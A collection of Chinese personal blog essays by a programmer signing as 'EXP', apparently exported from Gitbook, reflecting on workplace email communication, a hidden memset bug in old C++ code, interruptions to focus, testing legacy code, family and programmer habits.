细数公司十大经典金句之首，当孰【你难道没收到我的邮件？】无疑（了吧~ 我发誓我木有统计过）——尤其是邮件作为我们公司主要的沟通手段之一，我对这句话可谓印象深刻了。 回想刚到公司的时候，我还不会打座机电话（我承认我真的去学了打电话...），当时跟工程同事唯一的沟通手段就是邮件，有时甚至把邮件当QQ用了。但毕竟邮件不是QQ，时效性略差。有时候一些问题得不到确认，于是事后问对方最多的就是你有没有收到我的邮件了。 通常情况下，我们大部分人都有一个认知误区：只要把邮件发给对方了，对方就一定会知晓并执行，于是自己的沟通任务就完成了。但事实是，对方很可能没有（及时）收到邮件，即使收到了邮件，也不代表能够理解、接受、甚至执行。 沟通并不仅仅是发送邮件那么简单——发送邮件不过是沟通手段的一种，切莫把沟通手段和沟通过程混淆了。 真正意义上的沟通，是指思想碰撞并传递的过程。只有我和你能够以相同的角度去看待某个问题、理解其细节，才能说我和你完成了沟通。否则即使你清楚明白地看到了（听到了）我的每字每句，但是你不理解我的意思，那我和你也没有做任何有实际意义的沟通。 邮件上的沟通，按我们通常的说法，充其量只是“存证式的沟通”。确实它可以作为沟通证据，但过于依赖邮件则可能造成沟通障碍——尤其是当邮件包含的信息量越大，其中的细节就越容易被忽略。 况且信息淹没只是沟通障碍的一种。文化背景、个人偏见等主观因素也会成为沟通障碍的帮凶。为了减少类似不必要的障碍，我现在工作的时候，更倾向于面对面的、或电话式的交流，同时我也会定期写一些文章，借此向身边的人表述我近期的观点或见闻——我觉得消除障碍最好的方法就是让别人可以更直接地了解自己。 我越来越觉得，当一个问题被过于依赖用邮件去处理时候，处理周期越长，它就像抛绣球似得被抛来抛去。多用面对面或电话式的沟通，则可以促使我们在当下通过讨论去解决、反思问题。而写文章则可以避免直面的尴尬，在特定的时期向其他人表述自己的观点。 实际上，我一直以来都有写文章的习惯，而且我有自己的Blog。但自从去年开始公司办了内刊，我就把本应发表去Blog的一部分文章改投放到公司内刊了。原因有二：一是可以令身边的人更了解我的想法，增强他人对自己的熟悉感会利于平时沟通；二是我更喜欢公司有个人可以帮我对文章把关，使我的文笔有所提升——我并不介意文章被挑剔，因为我始终相信：“谁越是对你的文笔斤斤计较，谁就越可能是决定你前途的人”。 但沟通不仅仅相互理解、消除障碍就足够了。沟通也是需要策略的，首要一条就是让对方可以听懂并接受的方式去表述，否则只会徒增对方的失落感、甚至乎反感。其次就是用可以吸引对方注意力的方式去表述——我相信相比起一本新书，遍布重点的参考书更有吸引力，尤其在考试前。 最后我需要声明的是，写下这篇文章，并不是说邮件沟通有什么不好。恰恰相反，邮件作为“存证式”的沟通手段，是其他沟通方式不能替代的。而之所以用邮件说明问题，不过是作为这篇劣文一个引子，我真正所倡导的，是灵活、有效的沟通过程——这才是我们需要的——我们大可以在完成沟通后，再用邮件来存证一下不是么？ Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/找BUG记.html":{"url":"markdown/feelings/找BUG记.html","title":"找BUG记","keywords":"","body":"找BUG记令人头痛的陈年老BUG（序章）因注释而蔓延最危险的组合令人头痛的陈年老BUG（终章）找BUG记 —— By EXP 2014-03-22 令人头痛的陈年老BUG（序章） 前几天，码农朋友甲（下文简称“甲”）拿着我5年前发表在某博文的代码问我：“这段代码是有bug吧？”下面就是他给我指出来的一段C++代码，大家可以先尝试能不能找到甲看到的bug： void solve::Initial(void) { TimeStamp = 0; // 时间戳 DFN = new int[N+1]; // 搜索次序 Low = new int[N+1]; // 能够回溯的最早次序号 setIntArrayVal(DFN, 0, N+1); setIntArrayVal(Low, 0, N+1); SCC_id = 0; SCC = new int[N+1]; // 辅助栈 Status = new int[N+1]; // 辅助栈状态 setIntArrayVal(Status, 0, N+1); sp = new Shrink_point[N+1]; // 缩点（极大强连通分量） return; } void solve::setIntArrayVal(int* array, int val, int len) { memset(array, val, sizeof(int)*len); return; } 诚然，突然要我查一段几年前写下的代码是否有bug，我内心是比较抗拒的——尤其是我自己写的代码（我对自己还是有相当自信的）——毕竟人的弱点就是不善于揭发自己的短处。不过这都只是次要的心理因素。 归根结底，所谓打铁趁热，bug也是越早发现越好，新代码的bug总是要比历史代码的bug更容易处理。而面对这个陈年老bug，我已经完全忘记了我在5年前写这段代码的思绪，所以要我马上就应付甲的质疑是不可能的。与其再花费一番周折琢磨我自己的代码，我干脆直接就举手投问：“所有测试用例运行可以通过，是哪里有bug呢？” 因注释而蔓延 甲告诉我，是memset函数使用错误：在C++中，函数memset的作用是对一段连续的内存块赋值，即赋值的单位是字节，换而言之memset只能用于字节数组，但int数组不是字节数组。 void solve::setIntArrayVal(int* array, int val, int len) { memset(array, val, sizeof(int)*len); return; } 老实说，我很高兴甲会如此仔细的看我5年前的代码。而且毫无疑问，他的观点是正确的。但是也不见得我就是错的。因为早在那时我就已经知道memset函数的局限所在，但我坚持要用这个函数做数组的初始化，是因为我看中了它的效率—— 相对于逐个赋值的方法初始化数组元素、memset的效率要高得多，因为从寻址次数来看，前者的时间复杂度是O(n)、后者是O(1)，更何况当时所解决问题的n是上千万级别的。虽然我把memset用在非字节数组，只要我保证初始化的值只为0就不会有任何问题。事实上也是如此。 于是我自信满满地告诉甲，单纯断章取义地看我这个方法，确实是一个bug。但如果整体地去看我的代码就恰恰相反，我只是利用了bug，并得到了更高效的处理。 但是甲之后的一席话确实值得我深思： “或许对目前的这份代码而言，这个bug是被你巧妙地利用了，但是我觉得真正的bug或许不是你的代码，而是你没有文字注释去说明你的想法。不要忘记你已经共享了你的代码，当更多人看到这段程序时，如果他们不了解menset的原理就照样搬用，那么你就无异于在别人的代码中散播了bug，因为你不能把他们代码中的val限制为0。” 最危险的组合 不得不承认，甲是对的。即使我有足够的自信在5年后仍然记得利用这个bug的前因后果，但在这5年间早已误了不少别人的子弟...... 不过话说回来，先不论这个bug的蔓延性，甲能够如此深入琢磨我的历史遗留物、并发现这个bug实属难得——在软件中有一种bug是最难被发现的：组合式的bug。组合式的bug有两种类型：相辅相成型、相互弥补型——甲在我代码中发现的bug就属于后者。 相辅相成型：举例而言，一个bug是楼梯很滑，另一个bug扶手坏了，但除非这两个bug同时存在，否则只有其中一个bug是不足以让人摔下楼梯的。 相互弥补型：它与相辅相成型刚好相反，只有两个bug同时存在（或不存在）程序才会正常运行。若只修正了其中一个bug，另一个bug就会曝露出来，而且会让人有误以为自己改错了的假象，因为修改之前程序是可以正常运行的。 之所以说它难以发现，因为组合bug几乎无迹可寻，尤其是相互弥补型。除非是编译原理的狂热爱好者、抑或出现了非常极端的运行环境。存在组合bug的程序，其通常状态无异于正常程序，而且可能正常运行了很长时间都没有曝露出来。 回到我的代码，它已经正常运行5年了。如果甲没有向我质问他心中的疑惑，而是擅自修改了他所发现的bug，那么我的程序就无法正常运行了——而甲就很可能会因此陷入怀疑自己的正确性的境地。 令人头痛的陈年老BUG（终章） 事实上，不是所有bug都需要解决掉的。很多时候我们明明知道正在为代码引入一个bug，但是我们却依然保留它。因为回避它的代价太大了，我们宁愿限制它的前提条件不让它轻易发生、或者将其“圈养”起来（如try-catch）不让它暴走——如何容忍bug也是一门学问。 不过也总有一些技术葩喜欢另辟蹊径，誓言要代表月亮消灭所有bug维护代码界安全——先不说甲就是这种人，反正我是不会去消灭一个几年前就已经知道的bug的。如果要消灭它，我当时就做了，何必等到现在。 这前面提到的“新bug更易于旧bug被解决”是一个原因，但我真正担忧的是我或许会引入更多不可控的bug——代码的历史太久远了，我已经近乎忘记了它的逻辑，我一旦盲目修改，完全有可能采用了更危险的方法去解决那个稳定了5年的bug。 很多时候，我们写完一段代码，只要程序能够编译运行、完成需求功能就算完成了，鲜有考究bug的可能性，大部分的bug都是通过日后使用时再去发现和解决的。其实解决bug的黄金时间在于代码刚被编写的时候，这时候我们往往只需看到异常提示，就可以马上定位异常原因，因为潜意识中我们已经隐约觉得哪个位置会报什么异常了。 所以当我们在面对一些陈年老bug的时候，其实早就已经错过了解决它的最好时机。这时候不妨将其圈养起来，可能相比于消灭它，会令代码更安全。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/请还我安静的4小时.html":{"url":"markdown/feelings/请还我安静的4小时.html","title":"请还我安静的4小时","keywords":"","body":"请还我安静的4小时请还我安静的4小时 —— By EXP 2014-02-28 我大概总结了我每天分配的工作时间，一般情况下，我是这样汇报我的工作情况的： 实际上，我的工作情况却可能是这样的： 表面看来，这两个时间表所完成的工作内容是一模一样的，而且第一个时间表似乎可以更清晰地表述我一天的工作情况。但是它却无法反映出我的困扰：正如第二个凌乱的时间表所示——我的工作实际上是由无数的时间碎片构成的，而我们大部分人可能早已习惯了这个不正常的时间表。 通常，管理者为了更有效率地利用时间，他们很擅长在同一个时间处理多个问题，因为这可以体现出他们处事的应变能力。但我们程序员则更倾向于能够专注地做一件事：同样一件事，相比于断断续续地做4小时，专心地连续做4小时的效率要高得多。工作本就贵在专注，而一旦那种专注的状态被破坏，要恢复这种状态非但不易、而且还会白白浪费很多时间。 大家曾经都可能玩过一个堆纸牌金字塔的游戏，越想要砌得高、所需要的专注时间越长： 程序员开发软件，就好比堆纸牌的过程，想要迅速稳固，那么从开始到完成必须一气呵成，中途不能受到一丝打扰，否则整座金字塔都会散架，只能重头开始。 开发好的软件需要投入大量的精神时间，没有一段时间的酝酿是无法开展工作的。有时我们好不容易才有了一个构思的雏形，突如其来的打扰就会造成整个构思破产。这就是为什么每个程序员都非常讨厌在工作时被打扰的原因——可能十分钟的打扰，会多浪费我们一个小时的时间——这绝不是夸大其辞。 可惜往往事与愿违，公司绝大多数的环境都不允许我们安静地坐下来，完完全全地做自己的工作。在公司每天都有着持续不断的商讨、邮件、电话需要处理，其实这些事情很多都不是主要工作，但是因为时效性要求很高，把我们真正的工作时间变得支离破碎。 此前，我看过一篇关于 “时间是如何被浪费掉”的讨论。里面有个观点大概是说，浪费时间最危险的方式不是放纵消遣，而是花时间去“做假事”。因为当我们消遣的时候，至少知道我们在放纵自己，负罪感会让我们很快地结束这种状态。而所谓的“做假事”，是指我们在工作时间做一些非实质性的工作，例如收发邮件——花一整天的时间去处理邮件不是什么难以置信的事情，而且整个过程我们都会心安理得，因为这确实是工作。但如果过后问自己今天做了什么，我想很多人的答案基本上都是什么也没干。 我每天的工作都充斥着大量的假事。这些假事本已占用了工作时间，还因为不确定的出现时机，把主要工作的时间也掺和了。我的不少朋友都说，正是由于假事太多，导致白天在公司里根本无法静下心来做任何事情。他们宁愿选择在晚上完成主要工作，而在白天做一些次要的工作——或许这恰好也就是众多程序员都是夜猫子的成因，因为晚上没人打扰。 其实就我个人而论也是如此。我有时周末需要加班，但如非必要（如协同工作），我宁愿把工作带回去家里做。一来节省了来回公司的时间，二来效率确实比在公司高得多，往往要在公司做一天的事情，我在家里可能仅仅只需要短短的几个小时。 不过公司始终是公司，沟通交流是不可避免的一环，我们无法改变这个大环境，唯有从自身作要求，首先从不频繁地打扰别人做起，希望由此可以慢慢形成一种氛围——借由提供别人安静的工作环境，换取自己安静的工作环境——我要求不高，还我安静的3 - 4小时足矣。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/别让你的能力成为绊脚石.html":{"url":"markdown/feelings/别让你的能力成为绊脚石.html","title":"别让你的能力成为绊脚石","keywords":"","body":"别让你的能力成为绊脚石别让你的能力成为绊脚石 —— By EXP 2013-11-15 在溺水时拼命抓住的，真的是救命稻草吗？ 能力越强的人，往往对自己的能力越是依赖。但相对地，处理危机的灵活性可能就越弱——尤其在环境发生巨大变化时，这种能力或许就是妨碍自身拓展最大的绊脚石。 人都是善于习惯的动物：长期沉溺在单一的环境中，虽培养了能力、但同时也习惯了一成不变的感觉。尤其是在自身日益卓越的时候，更易于陶醉于自己的能力，稍有不慎便会让自负的优越感侵蚀全身，甚至于逐渐对其他技能产生淡漠感、对环境变化产生迟钝感。 俗话说“居安思危”。自身能力越是接近临界点的时候，也就是最容易让人安于现状的时候——擅长的能力难以提升、其他能力又无心拓展，一旦连最基本的危机感都失去，离被淘汰也就不远了。在此节骨眼上，往往是我们选择的分岔口：是追求精益求精、抑或探求一专多长？我不能帮任何人做出选择，但我个人认为，仅满足于一种能力对自身未必有益：在职业生涯中需要的能力是多元化的，因为这有利于我们可以在环境变化时快速反应、调整自身。我们更需要的是能及时抓住机遇，永远不要被一叶障目、成为井底之蛙。 或许终将有一日，海上刮起大浪，我们都翻船了、溺水了。这不是危言耸听。于是乎，我们为了自救，出于本能地拼命去抓住身边能够抓住的一切——而我们的能力就是我们的一切——但若是我们只有一种能力，那么能抓住的就只有这根稻草。这毫无办法，即使我们深知这根稻草恐怕无法让我们活命。 当然，并不是能力越多，活命的机会就越大，这两者并无绝对的相关性。我只是说，能力越多，我们能够选择自救的机会就越多——或者会出现浮板、甚至是木船——至少不会是那根弱不禁风的稻草。 我很清楚，我也只是个溺水的人。 但我们都将会是溺水的人。不过，我们都不应该只有一根稻草。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/我们需要的是测试而非重构.html":{"url":"markdown/feelings/我们需要的是测试而非重构.html","title":"我们需要的，是测试而非重构","keywords":"","body":"我们需要的，是测试而非重构我们需要的，是测试而非重构 —— By EXP 2013-11-13 上台一鞠躬。是的，久别两个月我又回来了。 最近忙着杂七杂八的一堆事，不过基本都是维护老项目代码了。一说起这个亘古不变的老话题，估计许多人都要开始抱怨了吧：没有格式没有篇章的混乱、没有甚至是错误的注释、没有说明文档……“我可写不出这种天才代码”、“实在太难看了，我要重构”之类的话我已经听不少了。 读代码难，但写代码也不见得很容易。老代码们都有着他们自己的项目背景，经手的人也多，日积月累自然而言就变成了现在的样子了。重构——说是很容易的——先不论我们的能力跟当时开发者相比孰优孰劣，他们会写出这样的代码总有他们的理由，只是经过时间的磨蚀，当时的缘由我们就不得而知了。 重构不是对付老代码最好的手段。重构首先会遇到最大的问题，就是刚才提到的项目背景，大多数的老代码除了满足基本需求功能，后期还会不断临时加入满足某些用户需求的特殊功能，若对这些不了解就轻易地重构，势必造成代码功能缺失。 之所以那么多人要重构老代码，因为我们都对它恐惧。而恐惧，则是源于我们对它的不了解。维护老代码时，我们怕破坏它的功能、怕造成程序的不稳定……我们维护自己的代码时，何曾会怕这怕那的？希望对老代码进行重构，不过是因为我们想把它变成自己的东西、方便自己操作而已。可一旦交接给下一个人，没准他又开始喊着要重构我们的代码了吧。 老代码告诉我们的是它的基本的样貌，不到万不得已，不必通过重构对它进行整容。我们只需要使用测试用例，去矫正它在岁月中留下的伤疤。 事实上，我们也应该强迫自己持续地给老代码做测试。刚开始这样做，可能会使得进度缓慢，但长期下去，我们就会有足够的测试用例，这除了使得老代码的功能可以更健壮，也使得我们对老代码更有信心，无需再过度担心维护代码时带来的副作用。 打个比方，举重运动员为了变得更健壮，日积月累地训练，终于使得腿部筋腱开始出现断裂。不过他认为持续的锻炼会使自己最终适应这种痛苦。但正如他每次下蹲都要忍受疼痛一样，没有测试用例的老代码在各种新功能附加的重压之下也开始出现扭曲、变形。后来医生告诉他应该重点做康复锻炼，因为只有在复健后，他的肌肉会变得更结实、能够承担更多重量。同样地，针对老代码的既有功能补充测试用例，可以使得老代码更健壮，当以后交接到别人手上的时候，重构的呼声自然也就会减少了。 不过有的时候，我们拿到手的老代码是已经有一定的测试用例的了，它们也能运行成功，但是这些测试却对理解老代码毫无帮助——有些测试是为了图方便而建立的，它们之所以能运行成功，是因为这些测试都是在假设代码能够顺利运行的理想情况下建立的——我们不需要这种花瓶式的测试用例。 其实最理想的情况，就是测试用例可以完全覆盖老代码，但实际上不可能——我们也不需要那样做——字典上单词都是用到时才去查的，测试用例也一样，不然你有看到过谁把字典背下来了吗？ Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/月缺梦圆.html":{"url":"markdown/feelings/月缺梦圆.html","title":"月缺，梦圆。","keywords":"","body":"月缺，梦圆。月缺，梦圆。 —— By EXP 2013-09-09 又是一年中秋时。 你多久没回家看过父母了？ …… 一个星期？一个月？抑或，一年？ …… 每个孩子从小都有一个愿望：独立。殊不知是狭隘的独立。年少的我们总是向往无拘无束的自由，而这种又总是单纯地诱使我们离开家里。于是选择远一点的地方念书，便成为了最简单的方法。而我，也不例外。 在我还在读书那会，我不怎么喜欢回家，纯粹只是因为怕麻烦。 那时候每个节日对我的意义，无非就是一个休息的日子——不管是春节也好，中秋也罢。虽然都会回家一趟看看父母，但总有一种“循例”的感觉在左右。“每逢佳节倍思亲”，那时的我，其实体会不深。 然后，就毕业了。 世事往往发生在意料之外、却又意料之中的无能为力。我因为工作来到了广州，可是昔日的同窗好友，却是一个都不在这里。或许只有到了真正举目无亲的时候，那种在语文课本念了几百遍的思乡情怀才真的会油然而生吧。 我又怎么想到有一天，回家，也会变成一种奢侈。 父母总是喜欢把我的前途放在首位，每次我打电话回家，跟父母说大概什么时候回去的时候，电话那头总是说：工作要紧，没时间就不用回了。我回家的时候，经常只能待1天、甚至更短，但只要我回去了，他们都会很开心。其实时间长短又何妨，我不过希望可以带回去一份心意，而已。 或许是成长总会带来一些自负，毕业的时候，我就跟自己说不会再问家里拿1分钱。因为我没有再依赖父母的理由，也没有资格去依赖他们。但是每次在家的时候，父亲总是问我钱够不够花，母亲则总是做一桌子我喜欢的菜。——他们都怕我一个人过得不好。 其实一个人又有什么所谓好不好的。我隐约觉得，我依赖了父母20年，父母又何尝不是依赖了我20年。只是我突然有一天真的离开了父母，不用他们照顾了，他们少了一份念想，觉得不习惯吧。我现在唯一可以告诉他们的，就是我过得很好，仅此而已。 我不怕被父母依赖。倒不如说，我希望有能力被父母依赖。早几年前开始，家里的大小事，父亲都会跟我商量。我那时候总跟父亲说：爸，你喜欢就好了，怎么决定我都没意见。有一次我母亲跟我谈到这个，她跟我说：你爸现在谁都不信，最信就是你……。我那天真的觉得，父母真的都已经老了。 算上大四那年，我出来工作已经一年多了，每次回到窝里，总是空荡荡的，总有种失落感。说真的，我比较怀念上中学的日子，起码每次回家都能看见父母，只悔那时不懂珍惜。 经常有人问我：你现在工作的地方跟家里那么近，回家不也是很方便吗？是很方便。但是物理上的距离再短，也是距离。影响沟通的距离。这种距离在心里累积起来，会变成难以驱散的孤独感，我不希望父母承受那种孤独感。 现在虽然父母嘴上不说，但是我知道他们总盼我什么时候能回家，可以见上一面，但又总是怕会烦叨我，没敢叫我回家。这种滋味不好受。所以我现在的愿望，就是可以把父母接到身边，安享晚年。至少，可以让他们少了一份牵挂。“父母在，不远游”，把父母留在家里，是我心头的一根刺。 之前在网上看过一篇文章：假设父母都能活到100岁，可等到我们工作的时候，他们的人生已经过半了。剩下50年，如果我们每年只回家1次，那也只能再见父母50次而已。我不知道这种日子还能有多长。但我希望在还没有失去的时候，可以好好地珍惜它。 中秋不过是个传统，我们不应该为了过中秋而过中秋。平时哪怕再忙，也应该常回家看看，好好想想自己的父母、家人。有些恩情，是我们穷尽一辈子都还不了的。 …… 月有阴晴圆缺。 但愿人长久，千里共婵娟。 …… 最后的最后，愿大家中秋阖家团圆，愿天下父母幸福安康。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/请发展你的惰性.html":{"url":"markdown/feelings/请发展你的惰性.html","title":"请发展你的惰性","keywords":"","body":"请发展你的惰性请发展你的惰性 —— By EXP 2013-08-04 你工作的时候就只是工作吗？ 我不一定。我有些时候不会把今天的所有时间都用在为了完成今天的工作任务中。而且我也相信，把全部时间都花费在工作并不代表就能很好地完成工作。 作为一个程序员，我上班时出现过的状态不外乎是三种，如果以键盘作为计量单位，那就是：不停地敲键盘、偶尔敲键盘、和不敲键盘。状态一基本就是忙于开发任务的时候，状态二一般就是调试代码的时候，而状态三就是在做跟当前工作没有直接关联的事情的时候。 如果把状态一和状态二视为对忠于工作任务的韧性，那么状态三应该就是我对工作的惰性了。不过于我而言，一和二不外乎都是体力劳动的一种，只能使我做完工作，但三却能帮我做好工作。 众所周知，程序员是脑力工作者，我们的价值在于如何运用我们的脑细胞。同样都是为工作的需求写代码，一套考虑周全的代码总比为了应付工作而写的代码生命力更持久，其维护难度也更低。其实IT行业发展至今，先辈们积累了无数这方面的知识，并作为可利用的财富流传下来，而我至今所学的也不过是沧海一粟。因此我比较喜欢看一些前人总结的经验心得，作为我忙中偷闲的乐趣，而契机不过是恰好工作有需要、或是偶尔的突发奇想罢了。 并非我们在开发和调试的过程中学不到东西，只不过这些大部分都只能够作为我们自身的经验被积累下来。要把经验转化为知识，是需要时间去顿悟的。相较之下，直接去累积前人有价值的知识，化为己用更为便捷。于当下确实是花费了一点工时，而且也未必对目前的工作任务起到关键性的作用，但之后总有其发挥价值的时候，这我深有体会。 当然，我对工作的这种惰性，有一部分是源于我对职业的兴趣，这也是使得我能够保持不疲于工作的心态的原因之一。虽然对当下工作任务而言，这种惰性有点不公，但我觉得对以后的工作、乃至于职业而言却是有好处的。 惰性是一种慢热型的能力，未必适用于所有人。即使要发展惰性，各人方向或许也有所不同，不过都应该要知道把握尺度，不要影响到相关工作的完成质量，毕竟惰性的发展并不是能够对工作不负责的借口。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/优雅的烂代码.html":{"url":"markdown/feelings/优雅的烂代码.html","title":"优雅的烂代码","keywords":"","body":"优雅的烂代码优雅的烂代码 —— By EXP 2013-07-28 /** * ┌───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┐ * │Esc│ │ F1│ F2│ F3│ F4│ │ F5│ F6│ F7│ F8│ │ F9│F10│F11│F12│ │P/S│S L│P/B│ ┌┐ ┌┐ ┌┐ * └───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┘ └┘ └┘ └┘ * ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───────┐ ┌───┬───┬───┐ ┌───┬───┬───┬───┐ * │~ `│! 1│@ 2│# 3│$ 4│% 5│^ 6│& 7│* 8│( 9│) 0│_ -│+ =│ BacSp │ │Ins│Hom│PUp│ │N L│ / │ * │ - │ * ├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─────┤ ├───┼───┼───┤ ├───┼───┼───┼───┤ * │ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │{ [│} ]│ | \\ │ │Del│End│PDn│ │ 7 │ 8 │ 9 │ │ * ├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤ └───┴───┴───┘ ├───┼───┼───┤ + │ * │ Caps │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│\" '│ Enter │ │ 4 │ 5 │ 6 │ │ * ├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────────┤ ┌───┐ ├───┼───┼───┼───┤ * │ Shift │ Z │ X │ C │ V │ B │ N │ M │ .│? /│ Shift │ │ ↑ │ │ 1 │ 2 │ 3 │ │ * ├─────┬──┴─┬─┴──┬┴───┴───┴───┴───┴───┴──┬┴───┼───┴┬────┬────┤ ┌───┼───┼───┐ ├───┴───┼───┤ E││ * │ Ctrl│ │Alt │ Space │ Alt│ │ │Ctrl│ │ ← │ ↓ │ → │ │ 0 │ . │←─┘│ * └─────┴────┴────┴───────────────────────┴────┴────┴────┴────┘ └───┴───┴───┘ └───────┴───┴───┘ */ 敏捷开发是当下软件开发的主流模式之一，为了摒弃以往瀑布式开发带来的弊端，敏捷开发推崇在团队中以个人为单位进行简单的模块化开发，它更注重的是团队间的沟通和模块间的衔接。 为了使代码层面上的沟通更便捷，一套套的编码规范和设计模式应运而生，毫无疑问，使用这些规范模式会使得我们的代码看起来更优雅，经验也证明这更有利于团队沟通。 对于经验丰富的程序员而言，针对某种功能使用合理的设计模式编写出规范的代码、并提供满足功能调用的接口，可能是易如反掌的事。但每个团队中都不可避免的会存在生涩的程序员，例如我。对我而言这种方式就并不完全是这么回事了。 即使我作为一个项目经验如何不足的程序员，独立开发一个简单功能模块的能力还是具备的。经常在编写代码之前，我脑中已有完整的思路，我可以很清晰地向别人陈述我的编程思想，我也很有信心可以把这些思想变成代码。但事实上这可能比我想象的要难得多。很多时候我发现我花费了比预期更多的时间，却无法写出一段可执行的代码。因为我在编码的时候，想得更多的不是如何去实现这个功能，而是如何让别人更舒服地看懂我的代码。 虽然很多开发团队都强调代码的优雅性，但这是以“可运行性”为前提的。这种过分放大观赏性代码的地位，本就是本末倒置的行为。优雅只是交流的辅助手段，但不是唯一的手段。 事实上，如果仅是实现需求的功能，而不去考虑任何外因，我确信我可以很快地写出一段可运行的“烂代码”。烂代码与优雅代码相比，最表面的区别可能仅是可读性差而已。而且团队开发很多时候并不需要关心别人开发的功能是如何实现的，这些优雅性的问题自然也不会被马上指出来了。 当然，我并不是倡导每个人都去写烂代码。烂代码只是一个过度的产物，考虑到以后代码的维护性和可扩展性，必须在烂代码保证功能需求后，对其进行重构。而往往优雅地重构自己既成的代码，很可能要比优雅地写出构思中的代码要容易得多。 摒弃优雅性的约束，烂代码使得开发过程更轻松、耗用资源更少、编程的目的性更强。其实这与敏捷开发的部分理念恰好是一致的：有目的指向的简单构建、有辅助指向的重构勇气。这正是烂代码的优雅之道。 /** * 頂頂頂頂頂頂頂頂頂　頂頂頂頂頂頂頂頂頂 * 頂頂頂頂頂頂頂　　　　　頂頂　　　　　 * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂 * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂 * 　　　頂頂　　　頂頂　　　　　　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　　　　　頂頂頂　 * 　　　頂頂　　　　　　頂頂　頂頂　頂頂 * 　頂頂頂頂　　　頂頂頂頂頂　頂頂頂頂頂 * 　頂頂頂頂　　　頂頂頂頂　　　頂頂頂頂 */ Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/程序员的病态.html":{"url":"markdown/feelings/程序员的病态.html","title":"程序员的\"病态\"","keywords":"","body":"程序员的\"病态\"密集空间恐惧症强迫症神经质妄想症程序员的\"病态\" —— By EXP 2013-07-16 每个程序员都是从菜鸟过来的，而菜鸟的成长之路总是崎岖的。不断地碰壁、不断地摸索、不断地成长，从中难免衍生出各种各样的“病态”，而这其实都是我们切实作为一个程序员的证明。 密集空间恐惧症 这应是程序员的通病了。不知道是谁的谎言：“程序员每天的工作就是看着一堆01代码”，这想着都会令人疯掉吧。每个程序员最怕看到的，就是那些一堆堆没换行没缩进的代码，更何况是一堆01代码。 如果一个程序员说他没有密集空间恐惧症，那他一定就是这堆代码的创始人之一了。我不理解为什么总有一些程序员要乐此不疲地代替编译器把代码中的空字符删去，编码规范出现的初衷，很可能就是为了对付这些程序员的——即使我忘记了我曾经或许也是他们中的一员。 强迫症 一些程序员在开发一个新项目的时候，会考虑太多情况，例如这种代码在以后的运行是否稳定、维护是否方便等。尤其是有一点项目经验但又不足、而且是完美主义者的程序员，在写代码的过程中会不断地考虑设计文档没有的东西，然后就很忘我地在项目代码上画蛇添足。 往往强迫自己写一个完美的程序的人，其现实就是：由于客观因素影响（如项目工时不足），导致最后提交的代码中出现太多没有被实现的抽象方法，结果反而是自己给自己挖了一堆无法填补的坑。 神经质 基本上每个正常的程序员都有点神经质的。一个显著的特点就是：我们对自己的代码充满信心、但看到别人的代码都会疑神疑鬼，习惯性地认为那有BUG，然后千方百计地将其找出来。如果有能力把BUG修复，还会因此感到非常有成就感，尽管那个BUG是无关痛痒的。 程序界有一个“潜规则”：每个程序中80%的BUG（漏洞）都是别人发现的。这跟程序员的神经质应是脱不了干系了。 妄想症 大部分程序员最初接触到一些已经投入使用、但看上去写得很差的项目代码时，就会开始妄想自己的能力，认为自己可以用最好的技术去重写它。由于是一时冲动，欠缺考虑因素太多（如背景、支撑环境等），往往都是失败告终。 其唯一的好处可能就是在重写的过程中，可能确实学到了一些未能投入使用的新技术，仅此而已。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/feelings/工作需要经营.html":{"url":"markdown/feelings/工作需要经营.html","title":"工作需要经营","keywords":"","body":"工作需要经营智于心，慧于行：审视自己的工作模式慎言笃行：真诚做人，踏实做事云在青天水在瓶：心态决定位置工作需要经营 —— By EXP 2013-06-18 转眼间我已实习了3个月有余，在这期间，相比于精通什么技能或业务，我更学会了应该如何去经营自己的工作。 我深深体会到工作并不是做好自己的份内事就足够的。单纯的努力工作，那只是为了谋生所付出的劳动；用心去经营的工作，才有可能会变成自己的事业。 智于心，慧于行：审视自己的工作模式 在公司里面，我被告知得更多的是如何去改善自己的工作模式，其中最倡导的是尽可能避免无意义的重复劳动。确实，平时与我们工作打交道的是各种各样的数据，要逐一去处理这些本质一样而问题各异的数据，无疑是事倍功半的行为。 好的工作模式，不仅可以提升工作效率，使我们逃离无意义劳动的怪圈，还可以实现公司价值和自身价值的双赢。而工作模式的优化，关键在于不断积累的经验。 